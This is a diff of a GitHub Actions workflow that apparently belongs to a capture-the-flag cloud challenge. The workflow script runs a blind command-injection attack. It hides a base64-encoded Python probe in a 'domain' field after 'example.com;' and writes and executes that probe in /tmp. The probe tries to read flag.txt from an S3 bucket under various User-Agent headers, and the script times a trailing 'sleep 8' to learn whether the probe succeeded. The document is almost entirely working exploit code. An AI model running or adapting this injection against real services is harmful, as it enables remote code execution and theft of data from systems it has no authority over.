@@ -1,4 +1,4 @@
-name: Stage2-22-Unsigned-S3-Corrected
+name: Stage2-23-Unsigned-VirtualHost
 
 on:
   push:
@@ -24,7 +24,7 @@ jobs:
         run: |
           python3 -m pip install requests requests-aws4auth --quiet
 
-      - name: Test unsigned S3 requests
+      - name: Test virtual-hosted S3 requests
         run: |
           python3 - <<'PY'
           import os
@@ -43,26 +43,28 @@ jobs:
               session_token=os.environ["AWS_SESSION_TOKEN"]
           )
 
-          user_agents = [
-              "Amazon CloudFront",
-              "CloudFront",
-              "Mozilla/5.0",
-              "nslookupv2",
-              "nslookup",
-              "AWSLambda",
-              "lambdaRole",
-              "CloudEscape",
-              "corgi",
-              "REDACTED",
-              "python-urllib"
+          tests = [
+              (
+                  "virtual_cloudfront_ua",
+                  "https://logad88e2b168aa387e.s3.us-east-1.amazonaws.com/flag.txt",
+                  "Amazon CloudFront"
+              ),
+              (
+                  "virtual_browser_ua",
+                  "https://logad88e2b168aa387e.s3.us-east-1.amazonaws.com/flag.txt",
+                  "Mozilla/5.0"
+              ),
+              (
+                  "virtual_empty_ua",
+                  "https://logad88e2b168aa387e.s3.us-east-1.amazonaws.com/flag.txt",
+                  ""
+              )
           ]
 
-          for user_agent in user_agents:
+          for name, url, user_agent in tests:
               inner_code = (
                   "import urllib.request\n"
-                  "url='https://s3.us-east-1.amazonaws.com/"
-                  "logad88e2b168aa387e/flag.txt'\n"
-                  f"req=urllib.request.Request(url, headers={{'User-Agent': {user_agent!r}}})\n"
+                  f"req=urllib.request.Request({url!r}, headers={{'User-Agent': {user_agent!r}}})\n"
                   "with urllib.request.urlopen(req, timeout=10) as r:\n"
                   "    r.read(1)\n"
               )
@@ -73,9 +75,24 @@ jobs:
                   "example.com; "
                   "printf '%s' "
                   + encoded
-                  + " | base64 -d > /tmp/unsigned_probe.py; "
-                  "python3 /tmp/unsigned_probe.py "
-                  ">/tmp/unsigned_result 2>&1 && sleep 8"
+                  + " | base64 -d > /tmp/vhost_probe.py; "
+                  "python3 /tmp/vhost_probe.py "
+                  ">/tmp/vhost_result 2>&1 && sleep 8"
               )
 
-              start = time.monot
+              start = time.monotonic()
+
+              response = requests.post(
+                  api,
+                  json={"domain": injected},
+                  auth=auth,
+                  timeout=30
+              )
+
+              elapsed = time.monotonic() - start
+
+              print("TEST=" + name)
+              print("HTTP=" + str(response.status_code))
+              print("ELAPSED=%.2f" % elapsed)
+              print("---")
+          PY
